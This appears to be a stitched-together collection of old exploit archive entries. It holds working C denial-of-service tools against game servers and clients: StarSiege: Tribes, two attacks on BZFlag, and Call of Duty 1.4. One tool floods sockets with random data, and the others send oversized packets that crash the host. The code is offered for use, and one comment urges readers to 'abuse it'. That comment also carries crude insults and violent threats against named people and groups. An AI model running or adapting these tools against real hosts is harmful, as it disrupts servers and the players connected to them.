This is POC code to test the computer game "StarSiege: Tribes" for a remote DoS. The DoS is caused by
sending a UDP packet with a payload of 255 arbitrary characters to the host game port causing an overflow in the
recieve buffer and the shutdown of the remote host.

Compile:
	VC++: cl /Febyebye_tribes.exe getopt.c byebye_tribes.c
	Borland: bcc32.exe -ebyebye_tribes.exe getopt.c byebye_tribes.c
	***Note: The Borland compiler generates a bunch of warnings, but the code is fine.

Stuff:
Yeah... this is real simple code. I coded it for Windows because most people that play tribes are using
Windows, though you can run tribes on Linux using WINE. Any problems, drop me a line: st0icATfsixDOTnet.

Original Advisory:
-------------------------
Advisory Name: "Starsiege: Tribes" DoS
Release Date: 07/14/2003
Discovered: 06/09/2003
Application: Tribes.exe
Platform: PC with Windows 2k; others not tested
Severity: High
Discovery: JadaCyruS <jadacyrus@fsix.net>
Author: st0ic <st0ic@fsix.net>
Vendor: Sierra Entertainment - http://www.sierra.com/
 
Overview:
     Sierra's "StarSiege: Tribes" game is vulnerable to a DoS (Denial of 
Service) attack when running. 
    
Technical Overview:    
     This vulnerability is exploited by sending a malformed UDP (User-Datagram 
Protocol) packet containing 255 arbitrary characters to the affected host on the 
game port (usually 28001) causing the host server to crash. If The server is 
running with help from InfiniteSpawn.exe, a program provided by the vendor that 
re-spawns the server when terminated, the server will be re-activated, but all 
previous game play and players are lost and disconnected.

Fix:
     Contacted Sierra over a month ago and we were "forwarded to their database 
admin" from which we received no further feedback. So, no vendor fix available.

Exploit:
     Attached PHP and C source.

Notes:
     Tribes 2 (PC) and Tribes Aerial Assault (Playstation 2) are untested as no 
one at Fsix owns a copy of them. Lets hope there not vuln.

-st0ic
[http://www.fsix.net/]
-------------------------
*/

#include <winsock.h>
#pragma comment(lib, "ws2_32.lib") /* used by the linker, must have this line! */
#include "getopt.h"
#include <stdio.h>
#include <errno.h>

void usage(char *ptr)
{
	fprintf(stderr, "\n\t%s <-h host> [-p port]", ptr);
	fprintf(stderr, "\n\tDefault port is 28001.");
	fprintf(stderr, "\n\tExample: %s -h 127.0.0.1 -p 28005\n", ptr);
	exit(1);
}

int main(int argc, char *argv[])
{
	struct sockaddr_in dest_addr;
	struct hostent *he;
	char data[255];
	unsigned short port = 28001; /* default game port */
	char *addr = NULL;
	int c;
	int count;
	SOCKET sockfd;
	WSADATA wsd;

	printf("\n\t[  byebye_tribes.c  ]");
	printf("\n\t[   c0ded by st0ic  ]");
	printf("\n\t[     Fsix.Net      ]");
	printf("\n\t[   st0ic@fsix.net  ]");
	printf("\n\t[ Vuln by JadaCyrus ]\n\n");
	if ( (argc < 3) || (argc > 5) )
		usage(argv[0]);

	while ( ( c = getopt(argc, argv, "h:p:") ) != -1)
	{
		switch(c)
		{
			case 'h':
			{
				addr = optarg;
				break;
			}
			case 'p':
			{
				port = (unsigned short)atoi(optarg);
				break;
			}
			default:
				usage(argv[0]);
		}
	}

	if (addr == NULL)
		usage(argv[0]);

	if (WSAStartup(MAKEWORD(2,2), &wsd) != 0)
    {
       printf("WSAStartup() failed.\n");
       exit(1);
    }
	if ( (he = gethostbyname(addr)) == NULL)
	{
		perror("gethostbyname");
		exit(1);
	}
	if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0) ) == SOCKET_ERROR)
	{
		perror("socket");
		exit(1);
	}

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_addr = *( (struct in_addr *) he->h_addr);
	dest_addr.sin_port = htons(port);
	memset (&dest_addr.sin_zero, 0, 8);

	/* setup 255 character payload */
	for(count = 0; count < 255; count++)
		data[count] = 'a';

	if (sendto(sockfd, (const char *)&data, sizeof(data), 
		0, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
    {
       printf("sendto() failed: %d\n", WSAGetLastError());
       exit(1);
    }
	printf("\n\t---[ Host: %s", addr);
	printf("\n\t---[ Port: %d", port);
	printf("\n\t---[ DoS Sent\n\n");

	return 0;
}source: http://www.securityfocus.com/bid/7649/info

BZFlag is prone to a denial of service vulnerability. Users that have established a session with BZFlag may cause a denial of service by reconnecting and flooding BZFlag ports with excessive amounts of data.

This issue was reported in BZFlag 1.7g0. Other versions are also likely affected. 

/* bzdeath.c by the russian code molester

   bzflag [bzflag.org] is a multiplayer 3D tank battle game, a bugfest
   and a cheaters heaven. bzflag listens on at least two tcp ports, one
   port feeding us the bzfs [bzflag server] version and reconnect port,
   and the other one where the real fun begins. force feeding these ports
   with some magic fairy powder can make bzfs go insane and eat itself.

   .. oi oi, what be this magik?! ..

   first, we connect to the target bzflag server and read the reconnect
   port data, 9th and 10th byte of handshake. then we reconnect to this
   port and flood it with random garbage, causing a cpu/mem leak in bzfs,
   making the cpu usage skyrocket. then, if that does not make the server
   go down, we reconnect back to the initial port and flood that too,
   causing havoc and total mayhem (segfault) to our little bzfs friend.

   this seems to work best on *fast* connections, LAN etc. however it has
   been tested quite sucessfully on slower connections as well (but don't
   get get your hopes up) - and note, even if the server does not die,
   the cpu/mem leak might still be triggered, munching away at all those
   precious cpu cycles.

   bzdeath.c compiles successfully under fbsd and linux.

   .. vulnerable versions ..

   this has only been tested on the newest stable release, 1.7g0, but I
   suspect that it will work just as good on the older ones as well.

   .. real life example ..

   ~$ gcc bzdeath.c -o bzdeath -O2 -Wall && ./bzdeath 10.0.2.36 5155
     -- connecting to 10.0.2.36:5155 ..
     -- connection established!
     -- recv(): 42 5a 46 53 31 30 37 65 14 24
     -- bzfs signature confirmed
     -- reconnect port is 5156
     -- connecting to 10.0.2.36:5156 ..
     -- connection established, attacking!
     -- 303 packets / 155136 bytes sent
     -- send() timeout
     -- reconnecting to 10.0.2.36:5155 ..
     -- attacking!
     -- 303 packets / 155136 bytes sent
     -- send() failed, reconnecting ..
     -- unable to connect, DoS successful?

   and on 10.0.2.36 gdb tells us,

   "Program received signal SIGSEGV, Segmentation fault.
    0x0805838b in alarm ()"

   .. final words form the dark side ..

   abuse it alot, and stay tuned for the upcoming stack smashing shell-
   spawning chachacha exploit for bzflag, soon to be released.

   oh, and if you can't make this work, blame yo mama, and if you haven't
   got one, blame someone else.

   and if those WHORES at neworder.box.sk put this file in their "latest
   vulnerabilities" section I will hunt them down and rip them apart with
   rusty nail clippers and chopsticks!

   and finally a big fuckyou-and-I-am-going-to-kill-all-of-you goes to
   electronic souls for being code stealing cockeaters, and dvdman for
   being born without both a brain and a penis.

   take care,
   -- russian code molester

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <signal.h>

#define BUFSIZE 512
#define TIMEOUT 10

int sockconnect(char*, int);
int sockattack();
void sigalrm_handler();
void sigpipe_handler();
void die(char*);
void banner();
void usage();

int sockfd;
int recon_port;
int orig_port;
char host[128];

int main(int argc, char **argv) {
  int i;
  char buf[BUFSIZE];
  char bzsign[8];

  if(argc < 3) usage();

  snprintf(host, sizeof host, "%s", argv[1]);
  orig_port = atoi(argv[2]);

  banner();

  srand(time(0));
  bzero(buf, sizeof buf);

  signal(SIGALRM, sigalrm_handler);
  signal(SIGPIPE, sigpipe_handler);

  printf(" -- connecting to %s:%s ..\n", argv[1], argv[2]);

  if(sockconnect(host, orig_port) == -1)
    die("unable to connect");

  printf(" -- connection established!\n");

  if(recv(sockfd, buf, 16, 0) <= 0)
    die("recv() failed");

  printf(" -- recv(): ");

  for(i = 0; i < strlen(buf); i++)
    printf("%02x ", buf[i]);

  printf("\n");

  sprintf(bzsign, "%c%c%c%c", buf[0], buf[1], buf[2], buf[3]);

  if(!strcmp(bzsign, "BZFS"))
    printf(" -- bzfs signature confirmed\n");
  else die("bzfs signature mismatch (NOT bzflag server)");

  if(strlen(buf) >= 10)
    recon_port = (((int) buf[strlen(buf) - 2]) << 8) | buf[strlen(buf) -
1];
  else die("server did not send reconnect port");

  if(recon_port >= 64 * 1024 || recon_port <= 0)
    die("server sent illegal reconnect port");

  printf(" -- reconnect port is %d\n", recon_port);
  printf(" -- connecting to %s:%d ..\n", host, recon_port);

  close(sockfd);

  if(sockconnect(host, recon_port) == -1)
    die("unable to connect");

  printf(" -- connection established, attacking!\n");

  while(1) {
    sockattack();
    close(sockfd);

    sleep(1);

    if(sockconnect(argv[1], recon_port) == -1)
      break;
  }

  printf(" -- unable to connect, DoS successful?\n");

  return 0;
}

int sockconnect(char *host, int port) {
  struct hostent *he;
  struct sockaddr_in remote_addr;

  if((he = gethostbyname(host)) == NULL)
    return -1;

  remote_addr.sin_family = AF_INET;
  remote_addr.sin_addr = *((struct in_addr *)he->h_addr);
  remote_addr.sin_port = htons(port);
  memset(&(remote_addr.sin_zero), 0x00, 8);

  if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    return -1;

  if(connect(sockfd, (struct sockaddr *)&remote_addr,
                                       sizeof(struct sockaddr)) == -1)
    return -1;

  return 0;
}

int sockattack() {
  char buf[BUFSIZE];
  unsigned long attack_packets = 0;
  int i;

  while(1) {
    alarm(TIMEOUT);

    for(i = 0; i < sizeof buf; i++)
      buf[i] = rand() % 256;

    attack_packets++;
    printf("\r -- %ld packets / %ld bytes sent ", attack_packets,
                                              attack_packets * sizeof
buf);
    fflush(stdout);

    if(send(sockfd, buf, sizeof buf, 0) != sizeof buf) {
      printf("\n -- send() failed, reconnecting ..\n");
      break;
    }

  }

  return 0;
}

void sigalrm_handler() {
  printf("\n -- send() timeout\n");
  close(sockfd);

  printf(" -- reconnecting to %s:%d ..\n", host, orig_port);

  if(sockconnect(host, orig_port) == -1)
    die("unable to connect, DoS successful?");

  printf(" -- attacking!\n");
  sockattack();

  return;
}

void sigpipe_handler() {
  printf("\n");
  die("got SIGPIPE, target dead?");
  return;
}

void die(char *text) {
  fprintf(stderr, " -- error: %s\n", text);
  exit(1);
}

void banner(void) {
  printf("B Z D E A T H . c by russian code molester . . .\n");
  return;
}

void usage(void) {
  fprintf(stderr, "usage: bzdeath <host> <port>\n");
  exit(1);
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// combined winerr.h /str0ke

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      0xffff
#define PORT        5154
#define TIMEOUT     8

#define WAITSEC     5
#define CALLSIGNSZ  32
#define MAILSZ      128
#define TOKENSZ     22
#define VERSIONSZ   60
#define TYPE        "\x00\x00"
#define TEAM        "\xff\xfe"  // autoteam



int bzflag_send(int sd, u_char *buff, u_char *code, ...);
int tcp_recv(int sd, u_char *data, int len);
u_short bzflag_recv(int sd, u_char *buff, u_char *code);
int create_rand_string(u_char *data, int len, u_int *seed);
int timeout(int sock, int secs);
u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u_int   seed;
    int     sd;
    u_short port = PORT,
            len;
    u_char  buff[BUFFSZ],
            callsign[CALLSIGNSZ + 1],
            mail[MAILSZ + 1],
            token[TOKENSZ + 1],
            version[VERSIONSZ + 1],
            code[2];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "BZFlag <= 2.0.4 (2.x) server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n"
            " This tool works also versus servers protected by password without knowing the\n"
            " keyword!\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- check server version: ", stdout);
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd, TIMEOUT) < 0) {
        printf("\nError: no reply received within %d seconds, this server doesn't seem valid\n\n", TIMEOUT);
        exit(1);
    }
    tcp_recv(sd, buff, 9);

    printf("   %s\n", buff);
    if(memcmp(buff, "BZFS", 4)) {
        fputs("- this server doesn't seem a valid BZFlag server, I try to continue\n", stdout);
    } else {
        if(memcmp(buff + 4, "00", 2)) {
            fputs("- this server uses a version which is not vulnerable, I try to continue\n", stdout);
        }
    }

    if(!timeout(sd, 0)) {   // 2.0.4 sends data while the previous 2.0 not
        len = bzflag_recv(sd, buff, code);
    }

    create_rand_string(callsign, CALLSIGNSZ, &seed);    // <=== THE BUG IS HERE
    create_rand_string(mail,     MAILSZ,     &seed);
    create_rand_string(token,    TOKENSZ,    &seed);
    create_rand_string(version,  VERSIONSZ,  &seed);

    bzflag_send(sd,
        buff,
        "en",
        2,          TYPE,
        2,          TEAM,
        CALLSIGNSZ, callsign,
        MAILSZ,     mail,
        TOKENSZ,    token,
        VERSIONSZ,  version,
        0);

    len = bzflag_recv(sd, buff, code);

    if(memcmp(code, "ac", 2)) {
        buff[len] = 0;
        printf("\n"
            "Error: code \"%.2s\"\n"
            "%s\n"
            "\n",
            code, buff + 2);
    }

    close(sd);

    fputs("- check server:\n", stdout);
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(
      (connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) ||
      (timeout(sd, 3) < 0)) {
        fputs("\n  Server IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\n"
            "  Server doesn't seem vulnerable\n"
            "  RELAUNCH THIS TOOL OTHER TIMES UNTIL YOU ARE UNABLE TO CRASH IT!!!\n"
            "\n", stdout);
    }
    close(sd);
    return(0);
}



int bzflag_send(int sd, u_char *buff, u_char *code, ...) {
    va_list ap;
    int     len;
    u_short *blen;
    u_char  *s,
            *p;

    blen = (u_short *)buff;
    memcpy(buff + 2, code, 2);
    p = buff + 4;

    va_start(ap, code);
    while((len = va_arg(ap, int))) {
        s = va_arg(ap, u_char *);
        memcpy(p, s, len);
        p += len;
    }
    va_end(ap);

    *blen = htons(p - (buff + 4));

    len = send(sd, buff, p - buff, 0);
    return(len);
}



int tcp_recv(int sd, u_char *data, int len) {
    int     t;

    while(len) {
        t = recv(sd, data, len, 0);
        if(t <= 0) return(-1);
        data += t;
        len  -= t;
    }

    return(0);
}



u_short bzflag_recv(int sd, u_char *buff, u_char *code) {
    u_short len;

    tcp_recv(sd, (u_char *)&len, 2);
    len = ntohs(len);

    tcp_recv(sd, code, 2);

    tcp_recv(sd, buff, len);

    return(len);
}



int create_rand_string(u_char *data, int len, u_int *seed) {
    u_int   rnd;
    u_char  *p = data;
    const static u_char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd = *seed;
//    len = rnd % len;  // max length!
//    if(len < 3) len = 3;

    while(len--) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        *p++ = table[rnd % (sizeof(table) - 1)];
    }
    *p = 0;

    *seed = rnd;
    return(p - data);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = secs;
    tout.tv_usec = 1000;    // in case secs is 0
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct hostent *hp;
    u_int host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-12-27]
/*         winerr.h         */

/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

/*  codboom.c */

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include <io.h>
    #include <malloc.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        28960
#define TIMEOUT     3
#define INFO        "\xff\xff\xff\xff" "getinfo xxx\n"
#define BOOM        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                        // must be major than 1023 bytes
#define SVBOF       "\xff\xff\xff\xff" "getinfo %s\n"
#define CLBOF       "\xff\xff\xff\xff" \
                    "%sResponse\n" \
                    "\\g_gametype\\dm" \
                    "\\gamename\\Call of Duty" \
                    "\\mapname\\mp_carentan" \
                    "\\protocol\\5" \
                    "\\scr_friendlyfire\\0" \
                    "\\scr_killcam\\0" \
                    "\\shortversion\\1.4" \
                    "\\sv_allowAnonymous\\0" \
                    "\\sv_floodProtect\\1" \
                    "\\sv_hostname\\Crash" \
                    "\\sv_maxclients\\26" \
                    "\\sv_maxPing\\0" \
                    "\\sv_maxRate\\10000" \
                    "\\sv_minPing\\0" \
                    "\\sv_privateClients\\0" \
                    "\\sv_punkbuster\\1" \
                    "\\sv_pure\\1" \
                    "\\pswrd\\0" \
                    "\\mod\\1" \
                    "\\crash\\%s"



void show_info(u_char *buff);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    int         sd,
                len,
                psz,
                on = 1,
                type;
    u_short     port = PORT;
    u_char      buff[BUFFSZ + 1];
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs("\n"
        "Call of Duty <= 1.4 server/client shutdown "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUsage: %s <attack> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " c = broadcast clients shutdown\n"
            " s = server shutdown\n"
            "     You must add the IP or the hostname of the server after the 's'.\n"
            "\n"
            "Some usage examples:\n"
            "  codboom c                      listens on port %d for clients\n"
            "  codboom c 1234                 listens on port 1234\n"
            "  codboom s 192.168.0.1          tests the server 192.168.0.1 on port %d\n"
            "  codboom s codserver 1234       tests the server codserver on port 1234\n"
            "\n", argv[0], PORT, PORT, PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif    

    type = argv[1][0];
    if(type == 's') {
        if(argc < 3) {
            printf("\n"
                "Error: you must specify the server IP or hostname.\n"
                "       Example: %s s localhost\n"
                "\n", argv[0]);
            exit(1);
        }
        peer.sin_addr.s_addr = resolv(argv[2]);
        if(argc > 3) port = atoi(argv[3]);
        printf("\n- Target   %s:%hu\n",
            inet_ntoa(peer.sin_addr),
            port);

    } else if(type == 'c') {
        peer.sin_addr.s_addr = INADDR_ANY;
        if(argc > 2) port = atoi(argv[2]);
        printf("\n- Listen on port %d\n", port);

    } else {
        fputs("\n"
            "Error: Wrong type of chosen attack.\n"
            "       You can choose between 2 types of attacks, passive versus clients with\n"
            "       'c' or versus servers with 's'\n"
            "\n", stdout);
        exit(1);
    }

    peer.sin_port   = htons(port);
    peer.sin_family = AF_INET;
    psz             = sizeof(peer);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    if(type == 's') {
        fputs("- Request informations\n", stdout);
        if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        if(timeout(sd) < 0) {
            fputs("\n"
                "Error: socket timeout, probably the server is not online or the port is wrong\n"
                "\n", stdout);
            exit(1);
        }
        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
        if(len < 0) std_err();
        buff[len] = 0x00;
        show_info(buff);

        fputs("- Send BOOM packet\n", stdout);
        len = sprintf(buff, SVBOF, BOOM);
        if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        if(timeout(sd) < 0) {
            fputs("\nServer IS vulnerable!!!\n\n", stdout);
        } else {
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) std_err();
            buff[len] = 0x00;
            printf("\n"
                "Server doesn't seem to be vulnerable, the following is the answer received:\n"
                "\n%s\n\n", buff);
        }
    } else {
        if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
          < 0) std_err();
        if(bind(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputs("  Clients:\n", stdout);
        for(;;) {
            len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
            if(len < 0) std_err();
            buff[len] = 0x00;

            printf("%16s:%hu -> %s\n",
                inet_ntoa(peer.sin_addr),
                ntohs(peer.sin_port),
                buff);

            if(!memcmp(buff + 4, "getinfo", 7)) {
                len = sprintf(buff, CLBOF, "info", BOOM);
            } else {
                len = sprintf(buff, CLBOF, "status", BOOM);
            }
            if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
        }
    }

    close(sd);
    return(0);
}





void show_info(u_char *buff) {
    int     nt = 1;
    u_char  *string;

    while((string = strchr(buff, '\\'))) {
        *string = 0x00;
        if(!nt) {
            printf("%30s: ", buff);
            nt++;
        } else {
            printf("%s\n", buff);
            nt = 0;
        }
        buff = string + 1;
    }
    printf("%s\n", buff);
}




int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}




u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
